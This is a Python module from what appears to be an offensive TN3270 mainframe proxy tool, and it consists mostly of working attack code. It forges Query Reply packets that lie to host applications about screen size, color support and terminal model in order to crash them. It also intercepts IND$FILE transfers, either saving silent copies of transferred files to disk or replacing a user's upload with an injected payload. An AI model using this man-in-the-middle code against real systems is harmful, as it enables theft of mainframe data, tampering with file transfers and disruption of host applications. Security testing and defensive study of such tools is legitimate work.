"""
Structured Field attacks: Query Reply lying + IND$FILE intercept.

Two attacks, one module — they share the SF parser/builder.

QUERY REPLY LYING (spec §3.4 part 1):
  Host sends: WSF Read Partition (Query) — asks the terminal "what can you do?"
  We eat it (don't forward to client). We synthesize a reply with lies:
  oversize screen (62×160 — see if BMS chokes), no color (some apps assume
  color and crash without it), spoofed RPQ name.

  Race-condition note: ProxyDaemon observers cannot drop packets — only
  set_client_intercept can, and that's c2s only. So _intercept_s2c() is
  exposed for the GUI/MCP layer to wire as a true filter BEFORE forward.
  When that wiring is unavailable, attaching as a plain observer will
  inject our reply IMMEDIATELY upon seeing the query, racing the real
  client's response. Best-effort; documented in spec §8.

IND$FILE INTERCEPT (spec §3.4 part 2 — implemented in Task 5):
  Detects File Transfer SF (type 0xD0). Reassembles 32K blocks.
  Carbon-copy / inject / alert modes.

References:
  GA23-0059 §5 — Structured Fields (general)
  GA23-0059 §6 — Query Reply (per-qcode formats)
"""
import re
import struct
import time
import pathlib
from typing import Optional, Literal

from hackterm_core.protocol import QueryLies, StructuredField
from hackterm_core.ebcdic import EbcdicCodec


# ===========================================================================
# Wire constants
# ===========================================================================

SFID_QUERY_REPLY = 0x81

# Query Reply qcodes (GA23-0059 §6 table)
QR_SUMMARY        = 0x80
QR_USABLE_AREA    = 0x81
QR_COLOR          = 0x86
QR_HIGHLIGHTING   = 0x87
QR_RPQ_NAMES      = 0xA1
QR_IMPLICIT_PART  = 0xA6
QR_NULL           = 0xFF

AID_SF = 0x88            # structured-field AID (terminal→host)
IAC_EOR = b"\xff\xef"
TN3270E_HDR_LEN = 5

# Read Partition (Query) detection — host→terminal
# Layout after WSF cmd (0xF3): <len:2> <SFID:1=0x01> <PID:1=0xFF> <type:1=0x02>
CMD_WSF = 0xF3
RP_SFID = 0x01           # Read Partition SFID
RP_QUERY_TYPE = 0x02     # Query (not Query List)


_codec = EbcdicCodec()


# ===========================================================================
# Individual SF builders — GA23-0059 §6
# Each returns a self-describing SF: <len:2 BE> <0x81> <qcode> <payload>
# ===========================================================================

def _sf(qcode: int, payload: bytes) -> bytes:
    """Wrap a payload in a Query Reply SF: <len:2> <0x81> <qcode> <payload>.
    Length is BIG-ENDIAN and INCLUDES the length field itself."""
    body = bytes([SFID_QUERY_REPLY, qcode]) + payload
    length = 2 + len(body)
    return struct.pack(">H", length) + body


def _sf_null() -> bytes:
    """Null SF — terminates the Query Reply sequence. GA23-0059 §6.34."""
    return _sf(QR_NULL, b"")


def _sf_summary(qcodes: list[int]) -> bytes:
    """Summary SF — lists which qcodes follow. GA23-0059 §6.41.
    Payload is just a sequence of qcode bytes."""
    return _sf(QR_SUMMARY, bytes(qcodes))


def _sf_usable_area(rows: int, cols: int) -> bytes:
    """Usable Area SF — screen dimensions. GA23-0059 §6.42.

    Payload (minimal):
      flags(1) addr-mode(1) cols(2) rows(2) units(1)
      Xr(4 — pels per unit, numerator/denominator)
      Yr(4 — same)
      AW(1) AH(1) — char cell width/height
      buffer(2 — total cells)
    """
    flags = 0x01        # 12/14-bit addressing supported
    addr_mode = 0x00    # default
    units = 0x01        # millimeters
    xr = struct.pack(">HH", 1, 10)   # 1/10 mm per pel (made-up but valid)
    yr = struct.pack(">HH", 1, 10)
    aw, ah = 9, 12      # char cell pels (typical 3270)
    bufsize = rows * cols
    payload = (bytes([flags, addr_mode])
               + struct.pack(">H", cols)
               + struct.pack(">H", rows)
               + bytes([units]) + xr + yr
               + bytes([aw, ah])
               + struct.pack(">H", bufsize))
    return _sf(QR_USABLE_AREA, payload)


def _sf_implicit_partition(alt_rows: int, alt_cols: int) -> bytes:
    """Implicit Partition SF — default + alternate sizes. GA23-0059 §6.31.

    Payload:
      flags(2 — reserved, zeros)
      SDP-length(1) SDP-id(1=0x0B) flags(1)
      default-cols(2) default-rows(2)
      alt-cols(2) alt-rows(2)
    """
    sdp = (bytes([0x0B, 0x01, 0x00])              # len, id, flags
           + struct.pack(">H", 80)                # default cols
           + struct.pack(">H", 24)                # default rows
           + struct.pack(">H", alt_cols)
           + struct.pack(">H", alt_rows))
    payload = bytes([0x00, 0x00]) + sdp
    return _sf(QR_IMPLICIT_PART, payload)


def _sf_color() -> bytes:
    """Color SF — supported color-attribute pairs. GA23-0059 §6.13.

    Payload:
      flags(1) np(1=count) (cav, ci)*np
    cav=color-attr-value (0x00=default, 0xF1-0xF8=colors)
    ci=color-identifier (same values)
    """
    flags = 0x00
    pairs = []
    pairs.append((0x00, 0xF4))  # default → green
    for c in range(0xF1, 0xF9):  # all 8 standard colors
        pairs.append((c, c))
    np = len(pairs)
    payload = bytes([flags, np]) + b"".join(bytes([a, i]) for a, i in pairs)
    return _sf(QR_COLOR, payload)


def _sf_highlighting() -> bytes:
    """Highlighting SF — supported highlight values. GA23-0059 §6.29.

    Payload: np(1) (av, hi)*np
    av=attr-value, hi=highlight-id
    Standard: 0x00=default 0xF1=blink 0xF2=reverse 0xF4=underscore
    """
    pairs = [(0x00, 0xF0), (0xF1, 0xF1), (0xF2, 0xF2), (0xF4, 0xF4)]
    np = len(pairs)
    payload = bytes([np]) + b"".join(bytes([a, h]) for a, h in pairs)
    return _sf(QR_HIGHLIGHTING, payload)


def _sf_rpq(name: str) -> bytes:
    """RPQ Names SF — terminal model identifier. GA23-0059 §6.36.

    Payload:
      device-type(4 — EBCDIC, e.g. '3278')
      model(3 — EBCDIC, e.g. '002')
      RPQ-len(1) RPQ-name(EBCDIC, variable)
    """
    devtype = _codec.to_ebcdic("3278")
    model = _codec.to_ebcdic("002")
    rpq_ebcdic = _codec.to_ebcdic(name)
    payload = devtype + model + bytes([len(rpq_ebcdic)]) + rpq_ebcdic
    return _sf(QR_RPQ_NAMES, payload)


# ===========================================================================
# Full Query Reply assembly
# ===========================================================================

def build_query_reply(lies: QueryLies, tn3270e: bool = False,
                      seq: int = 0) -> bytes:
    """Synthesize a complete Query Reply packet.

    Layout: [TN3270E hdr] AID(0x88) <SF>*N <Null SF> IAC EOR

    The lies:
      alt_rows/alt_cols     → Usable Area + Implicit Partition with those values
      deny_color            → omit Color SF (some apps assume color, crash)
      deny_highlighting     → omit Highlighting SF
      rpq_name              → claim to be that terminal model
    """
    sfs = []

    # Build the qcode list for Summary
    qcodes = [QR_SUMMARY, QR_USABLE_AREA]
    if lies.alt_rows or lies.alt_cols:
        qcodes.append(QR_IMPLICIT_PART)
    if not lies.deny_color:
        qcodes.append(QR_COLOR)
    if not lies.deny_highlighting:
        qcodes.append(QR_HIGHLIGHTING)
    if lies.rpq_name:
        qcodes.append(QR_RPQ_NAMES)
    qcodes.append(QR_NULL)

    # Summary first — tells host what's coming
    sfs.append(_sf_summary(qcodes))

    # Usable Area — always present
    rows = lies.alt_rows or 24
    cols = lies.alt_cols or 80
    sfs.append(_sf_usable_area(rows, cols))

    # Implicit Partition — only if alt size requested
    if lies.alt_rows or lies.alt_cols:
        sfs.append(_sf_implicit_partition(rows, cols))

    if not lies.deny_color:
        sfs.append(_sf_color())
    if not lies.deny_highlighting:
        sfs.append(_sf_highlighting())
    if lies.rpq_name:
        sfs.append(_sf_rpq(lies.rpq_name))

    # Null terminator
    sfs.append(_sf_null())

    body = bytes([AID_SF]) + b"".join(sfs) + IAC_EOR

    if tn3270e:
        hdr = bytes([0x00, 0x00, 0x00, (seq >> 8) & 0xFF, seq & 0xFF])
        return hdr + body
    return body


# ===========================================================================
# Read Partition Query detection
# ===========================================================================

def _strip_envelope(data: bytes) -> bytes:
    """Strip TN3270E header (if present) and trailing IAC EOR.

    The TN3270E header heuristic: data-type byte is 0x00–0x07 (RFC 2355
    table 3). Real write commands start at 0xF1+, so a leading byte ≤ 0x07
    on a packet long enough to hold a header is treated as TN3270E.
    """
    i = 0
    if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
        i = TN3270E_HDR_LEN
    end = len(data)
    if end >= 2 and data[end-2:end] == IAC_EOR:
        end -= 2
    return data[i:end]


def is_read_partition_query(data: bytes) -> bool:
    """Is this packet a WSF Read Partition (Query)?

    Layout: [TN3270E hdr(5)] F3 <len:2> 01 FF 02 [IAC EOR]
                             ^^ WSF     ^^ ^^ ^^
                                        SF PID type=Query
    """
    body = _strip_envelope(data)
    if len(body) < 6:
        return False
    if body[0] != CMD_WSF:
        return False
    # body[1:3] is SF length, body[3] is SFID,
    # body[4] is partition-id, body[5] is type
    return body[3] == RP_SFID and body[5] == RP_QUERY_TYPE


# ===========================================================================
# QueryReplyLiar — the campaign object
# ===========================================================================

class QueryReplyLiar:
    """Intercept Read Partition Query and reply with lies.

    Hooks ProxyDaemon two ways:
      1. As an s2c filter — eats the WSF Read Partition (Query) so it
         never reaches the real client.
      2. Calls daemon.inject_to_server() with our synthetic reply.

    The s2c filter is NOT a standard observer (observers can't drop
    packets). We expose _intercept_s2c() for the GUI/MCP layer to wire
    as a true filter before forward. When that wiring is unavailable,
    the observer fallback in attach() will inject the lying reply
    IMMEDIATELY upon seeing the query — racing the real client. The
    host typically accepts the first reply and ignores the second.
    """

    def __init__(self):
        self.armed = False
        self.lies = QueryLies()
        self._daemon = None
        self._tn3270e = False
        self._seq = 0

    def attach(self, daemon) -> None:
        """Attach to daemon. Registers an observer for race-mode fallback."""
        self._daemon = daemon
        daemon.add_observer(self._observe)

    def arm(self, lies: QueryLies) -> None:
        """Enable interception with the given lies."""
        self.lies = lies
        self.armed = True

    def disarm(self) -> None:
        self.armed = False

    def _observe(self, data: bytes, direction: str) -> None:
        """Observer fallback: can't drop, but can race the client's reply."""
        if direction != "s2c":
            return
        self._intercept_s2c(data)

    def _intercept_s2c(self, data: bytes) -> Optional[bytes]:
        """Filter for s2c traffic. Returns None to EAT the packet,
        or returns data (possibly modified) to forward.

        When wired as a true s2c filter, returning None drops the
        query before it reaches the client. When called via the
        observer path, the return value is ignored — but the
        inject_to_server() side-effect still races the client.
        """
        if not self.armed:
            return data
        if not is_read_partition_query(data):
            return data

        # It's a Read Partition Query and we're armed. EAT IT.
        # Detect TN3270E so we know whether to prepend header on our reply.
        if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
            self._tn3270e = True
            self._seq = (data[3] << 8) | data[4]
        else:
            self._tn3270e = False
            self._seq = 0

        # Synthesize and inject our reply
        reply = build_query_reply(self.lies, tn3270e=self._tn3270e,
                                  seq=self._seq)
        if self._daemon:
            self._daemon.inject_to_server(reply)

        return None  # EAT — don't forward the query to the real client


# ===========================================================================
# WSF parser — extracts StructuredField from a WSF datastream
# ===========================================================================

SFID_FILE_TRANSFER = 0xD0
SUBTYPE_EOF = 0x45


def parse_wsf(data: bytes) -> Optional[StructuredField]:
    """Parse a Write Structured Field datastream.

    Layout: [TN3270E hdr] F3 <len:2> <sfid:1> <payload...> [IAC EOR]

    Returns the FIRST SF in the stream (multi-SF WSF is rare and
    we only care about File Transfer which is single-SF).
    """
    body = _strip_envelope(data)

    if len(body) < 4 or body[0] != CMD_WSF:
        return None

    # body[1:3] = SF length (BE, includes itself), body[3] = SFID
    sf_len = struct.unpack(">H", body[1:3])[0]
    sfid = body[3]
    # Payload is everything after sfid, up to sf_len bytes from len-field start
    payload_end = 1 + sf_len  # 1 (cmd byte) + sf_len (counted from len field)
    payload = body[4:payload_end]

    return StructuredField(sf_type=sfid, payload=payload)


# ===========================================================================
# IndFileInterceptor — File Transfer SF reassembler
# ===========================================================================

IndFileMode = Literal["carbon_copy", "inject", "alert"]
IndFileState = Literal["IDLE", "ARMED", "TRANSFERRING"]

# Match "IND$FILE PUT <name>" or "IND$FILE GET <name>" in screen text.
# Note: $ is a regex metachar — escape it.
_INDFILE_RE = re.compile(r"IND\$FILE\s+(PUT|GET)\s+(\S+)", re.IGNORECASE)


class IndFileInterceptor:
    """Detect and reassemble IND$FILE transfers.

    State machine (spec §3.4):
      IDLE → (see "IND$FILE PUT/GET" in screen text) → ARMED
      ARMED → (see SFID 0xD0) → TRANSFERRING
      TRANSFERRING → (accumulate blocks) → (see EOF subtype) → IDLE

    Modes:
      carbon_copy — write reassembled file to capture_dir/<ts>_<dir>_<name>.bin
      inject      — (PUT only) replace user's upload blocks with inject_payload
      alert       — just log to captures list, no disk write
    """

    def __init__(self, capture_dir: str = "./captured_files"):
        self.state: IndFileState = "IDLE"
        self.mode: IndFileMode = "alert"
        self.direction: Optional[str] = None        # "PUT" or "GET"
        self.dataset_name: Optional[str] = None
        self.buffer = bytearray()
        self.captures: list[dict] = []
        self.capture_dir = pathlib.Path(capture_dir)
        self.inject_payload: Optional[bytes] = None
        self._inject_sent = False
        self.protocol = None
        self._daemon = None

    def attach(self, daemon) -> None:
        self._daemon = daemon
        daemon.add_observer(self._observe)

    # --- State machine driver --------------------------------------------

    def _observe(self, data: bytes, direction: str) -> None:
        """Main observer — drives the state machine on every packet."""
        if self.state == "IDLE":
            self._check_arm(data, direction)
        elif self.state in ("ARMED", "TRANSFERRING"):
            self._check_block(data)

    def _check_arm(self, data: bytes, direction: str) -> None:
        """IDLE state: watch for IND$FILE command in screen text.

        We require a protocol parser to render EBCDIC screen → ASCII.
        Without one we stay IDLE (no false positives on raw bytes).
        """
        if direction != "s2c" or self.protocol is None:
            return
        try:
            screen = self.protocol.parse(data)
        except Exception:
            return  # not a parseable screen — keep waiting
        m = _INDFILE_RE.search(screen.text)
        if m:
            self.state = "ARMED"
            self.direction = m.group(1).upper()
            self.dataset_name = m.group(2)
            self.buffer = bytearray()
            self._inject_sent = False

    def _check_block(self, data: bytes) -> None:
        """ARMED/TRANSFERRING: watch for File Transfer SFs (SFID 0xD0)."""
        sf = parse_wsf(data)
        if sf is None or sf.sf_type != SFID_FILE_TRANSFER:
            return

        # First byte of payload is the subtype; rest is block data.
        if len(sf.payload) < 1:
            return
        subtype = sf.payload[0]
        block_data = sf.payload[1:]

        if subtype == SUBTYPE_EOF or (self.state == "TRANSFERRING" and not block_data):
            self._finish_transfer()
            return

        self.state = "TRANSFERRING"
        self.buffer.extend(block_data)

    def _finish_transfer(self) -> None:
        """EOF reached — write file (carbon_copy) or just log (alert)."""
        capture = {
            "timestamp": time.time(),
            "direction": self.direction,
            "dataset": self.dataset_name,
            "size": len(self.buffer),
            "path": None,
        }

        if self.mode == "carbon_copy" and self.buffer:
            self.capture_dir.mkdir(parents=True, exist_ok=True)
            ts = int(capture["timestamp"])
            d = self.direction or "UNK"
            name = (self.dataset_name or "unnamed").replace(".", "_")
            path = self.capture_dir / f"{ts}_{d}_{name}.bin"
            path.write_bytes(bytes(self.buffer))
            capture["path"] = str(path)

        self.captures.append(capture)
        self.state = "IDLE"
        self.buffer = bytearray()
        self.direction = None
        self.dataset_name = None

    # --- Inject mode (PUT only) -----------------------------------------

    def _intercept_c2s(self, data: bytes) -> bytes:
        """Client→server intercept for inject mode.

        Wire via daemon.set_client_intercept(). When ARMED for a PUT and
        the user sends a File Transfer block, replace its payload with
        ours. Best-effort — may corrupt transfers if block boundaries
        don't align (spec §8 acknowledges this is out of scope to harden).
        """
        if (self.mode != "inject" or self.direction != "PUT"
                or self.inject_payload is None):
            return data

        sf = parse_wsf(data)
        if sf is None or sf.sf_type != SFID_FILE_TRANSFER:
            return data

        if self._inject_sent:
            # Already sent our payload — pass through subsequent blocks
            # (which should just be the EOF)
            return data

        # Rebuild with our payload. Keep the subtype byte from the original.
        subtype = sf.payload[0] if sf.payload else 0x46
        new_payload = bytes([SFID_FILE_TRANSFER, subtype]) + self.inject_payload
        sf_len = struct.pack(">H", 2 + len(new_payload))
        rebuilt = bytes([CMD_WSF]) + sf_len + new_payload + IAC_EOR

        # Preserve TN3270E header if present
        if len(data) >= TN3270E_HDR_LEN + 1 and data[0] <= 0x07:
            rebuilt = data[:TN3270E_HDR_LEN] + rebuilt

        self._inject_sent = True
        return rebuilt
